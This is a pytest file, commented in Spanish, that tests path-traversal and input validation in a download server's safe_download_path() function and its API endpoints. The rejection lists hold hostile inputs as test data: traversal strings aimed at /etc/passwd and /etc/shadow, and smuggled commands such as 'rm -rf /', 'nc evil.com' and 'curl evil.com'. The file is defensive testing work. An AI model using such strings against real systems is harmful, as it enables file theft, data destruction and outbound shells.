"""
safe_download_path() y la protección contra path traversal.

`download_id` viene del cliente y se convierte en una ruta del sistema de
ficheros, así que es el punto más sensible del backend. Cualquier regresión
aquí permite leer o borrar ficheros fuera de TEMP_DIR.
"""

import os

import pytest


# ========================================
# IDs válidos
# ========================================

@pytest.mark.parametrize("download_id", [
    "a" * 32,
    "0123456789abcdef0123456789abcdef",
    "f" * 32,
])
def test_valid_ids_are_accepted(srv, temp_dir, download_id):
    path = srv.safe_download_path(download_id)
    assert path is not None
    assert path.startswith(os.path.realpath(str(temp_dir)))


def test_real_uuid_format_is_accepted(srv, temp_dir):
    """El servidor usa uuid4().hex: 32 hex. Ese formato debe pasar siempre."""
    import uuid
    for _ in range(50):
        did = uuid.uuid4().hex
        assert srv.safe_download_path(did) is not None, f"rechazado: {did}"


@pytest.mark.parametrize("download_id", [
    "abc12345",                              # el formato viejo de 8 caracteres
    "a1b2c3d4",
    "12345678-1234-1234-1234-123456789abc",  # UUID con guiones
    "a",
    "-",
    "a" * 31,
    "a" * 33,
])
def test_short_and_legacy_ids_are_rejected(srv, temp_dir, download_id):
    """
    Tras el plan 02 T7 los identificadores son de 32 hex exactos. Los antiguos
    de 8 caracteres eran enumerables, y /api/download/<id> entrega el fichero
    **y borra la carpeta**: acertar un id le quitaba la descarga a su dueño.
    """
    assert srv.safe_download_path(download_id) is None


# ========================================
# Path traversal
# ========================================

@pytest.mark.parametrize("download_id", [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../../../etc/shadow",
    "..",
    "../",
    "./../../root",
    "foo/../../../etc",
])
def test_traversal_is_rejected(srv, temp_dir, download_id):
    assert srv.safe_download_path(download_id) is None


@pytest.mark.parametrize("download_id", [
    "/etc/passwd",
    "/",
    "//etc/passwd",
    "C:\\Windows\\System32",
    "\\\\servidor\\share",
])
def test_absolute_paths_are_rejected(srv, temp_dir, download_id):
    assert srv.safe_download_path(download_id) is None


@pytest.mark.parametrize("download_id", [
    "abc/def",
    "abc\\def",
    "abc;rm -rf /",
    "abc$(whoami)",
    "abc`id`",
    "abc|nc evil.com",
    "abc&&curl evil.com",
    "abc\x00.txt",
    "abc\ndef",
    "abc def",
    "ABC12345",       # mayúsculas: fuera del charset [a-f0-9-]
    "xyz12345",       # letras fuera de hex
    "abc%2e%2e",      # traversal codificado
    "",
])
def test_invalid_charset_is_rejected(srv, temp_dir, download_id):
    assert srv.safe_download_path(download_id) is None


def test_overlong_id_is_rejected(srv, temp_dir):
    """El regex exige exactamente 32 caracteres hexadecimales."""
    assert srv.safe_download_path("a" * 37) is None
    assert srv.safe_download_path("a" * 500) is None


def test_result_always_inside_temp_dir(srv, temp_dir):
    """Invariante central: nada de lo que devuelva puede salir de TEMP_DIR."""
    base = os.path.realpath(str(temp_dir))
    for did in ["abc12345", "0" * 36, "a-b-c", "f" * 8]:
        path = srv.safe_download_path(did)
        if path is not None:
            assert path.startswith(base + os.sep)


# ========================================
# Los endpoints que lo usan rechazan lo mismo
# ========================================

@pytest.mark.parametrize("endpoint", [
    "/api/progress/{}",
    "/api/download/{}",
])
@pytest.mark.parametrize("bad_id", [
    "../etc/passwd",
    "abc/def",
    "ABC123",
    "a" * 50,
])
def test_endpoints_reject_bad_ids(client, endpoint, bad_id):
    resp = client.get(endpoint.format(bad_id))
    assert resp.status_code in (400, 404), (
        f"{endpoint} aceptó un id peligroso: {bad_id} (status {resp.status_code})"
    )


def test_delete_endpoint_rejects_bad_id(client):
    """
    Werkzeug normaliza `/api/download/../../etc` a `/etc` antes de enrutar,
    así que devuelve 405 en vez de 400. El invariante que importa es que
    no se ejecute el borrado: cualquier 4xx vale.
    """
    resp = client.delete("/api/download/../../etc")
    assert 400 <= resp.status_code < 500


def test_cancel_endpoint_rejects_bad_id(client):
    resp = client.post("/api/cancel/..%2F..%2Fetc")
    assert 400 <= resp.status_code < 500


def test_delete_with_valid_charset_but_nonexistent_is_handled(client):
    """Un id bien formado que no existe no debe romper: responde sin error 5xx."""
    resp = client.delete("/api/download/" + "d" * 32)
    assert resp.status_code < 500


# ========================================
# /api/stream usa su propia validación (más débil): que siga cubriendo lo básico
# ========================================

@pytest.mark.parametrize("bad_id", [
    "../etc/passwd",
    "abc/def",
    "abc\\def",
])
def test_stream_endpoint_rejects_traversal(client, bad_id):
    resp = client.get(f"/api/stream/{bad_id}")
    assert resp.status_code in (400, 404)


def test_stream_rejects_malformed_id(client):
    """Tras el plan 03 T3, stream_file valida con safe_download_path como el resto."""
    assert client.get("/api/stream/deadbeef").status_code == 400


def test_stream_missing_file_is_404(client):
    """Id bien formado pero sin carpeta: 404, no 400."""
    assert client.get("/api/stream/" + "d" * 32).status_code == 404


# ========================================
# /assets/<path> usa safe_join
# ========================================

@pytest.mark.parametrize("bad_path", [
    "../server.py",
    "../../etc/passwd",
    "....//....//etc/passwd",
])
def test_assets_route_blocks_traversal(client, bad_path):
    resp = client.get(f"/assets/{bad_path}")
    assert resp.status_code == 404
    if resp.is_json:
        assert "no encontrado" in resp.get_json().get("error", "").lower()
